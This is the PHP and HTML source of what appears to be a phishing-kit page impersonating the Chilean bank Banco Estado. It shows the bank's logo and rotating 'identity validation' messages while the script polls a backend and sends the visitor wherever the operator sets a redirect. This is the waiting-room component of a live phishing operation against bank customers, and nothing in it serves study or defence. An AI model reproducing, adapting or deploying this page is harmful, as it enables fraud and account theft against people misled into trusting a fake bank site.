<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

session_write_close();
session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
            echo json_encode(['redirect' => $_SESSION['redirect']]);
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        } else {
            echo json_encode(['redirect' => null]);
        }
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
            text-align: center;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 40px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 155px;
            height: 155px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 35px;
            line-height: 1.3;
        }

        .counter-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .counter-circle {
            position: absolute;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(#3B4FB5 var(--percentage), #E8E8F0 0);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .counter-inner {
            width: 110px;
            height: 110px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .counter-number {
            font-size: 36px;
            font-weight: 700;
            color: #3B4FB5;
        }

        .counter-label {
            font-size: 10px;
            color: #A8A8B3;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .loading-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #E8E8F0;
            border-top: 4px solid #3B4FB5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 14px;
            color: #666666;
            font-weight: 500;
        }

        .status-message {
            font-size: 12px;
            color: #A8A8B3;
            margin-top: 10px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 24px;
            }

            .spinner {
                width: 40px;
                height: 40px;
                border: 3px solid #E8E8F0;
                border-top: 3px solid #3B4FB5;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Título dinámico -->
        <h1 class="title" id="dynamicTitle">Validando Identidad</h1>

        <!-- Sección de Carga -->
        <div class="loading-section">

            <div class="loading-text" id="statusText">Por favor espera</div>
            <div class="status-message">Procesando solicitud...</div>
        </div>
    </div>

  <script>
    // Array de mensajes dinámicos que cambian cada 5 segundos
    const mensajes = [
        'Validando Identidad',
        'Verificando Datos',
        'Procesando Solicitud',
        'Autenticando Usuario',
        'Validando Información'
    ];
    let indiceActual = 0;
    
    // Función para cambiar el título con animación
    function cambiarTitulo() {
        const titulo = document.getElementById('dynamicTitle');
        titulo.style.animation = 'none';
        
        setTimeout(() => {
            titulo.textContent = mensajes[indiceActual];
            titulo.style.animation = 'fadeInOut 0.5s ease-in-out';
            indiceActual = (indiceActual + 1) % mensajes.length;
        }, 50);
    }
    
    // Cambiar título cada 5 segundos
    setInterval(cambiarTitulo, 5000);
    
    // Agregar animación al documento
    const estilo = document.createElement('style');
    estilo.textContent = `
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(-5px); }
            50% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(5px); }
        }
    `;
    document.head.appendChild(estilo);
</script>
<script>

/* REDIRECCION BACKEND */
function checkRedirect() {
    fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, "UTF-8"); ?>&check=1')
        .then(res => res.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            } else {
                setTimeout(checkRedirect, 1500);
            }
        })
        .catch(() => setTimeout(checkRedirect, 1500));
}

window.onload = checkRedirect;
</script>
</body>
</html>
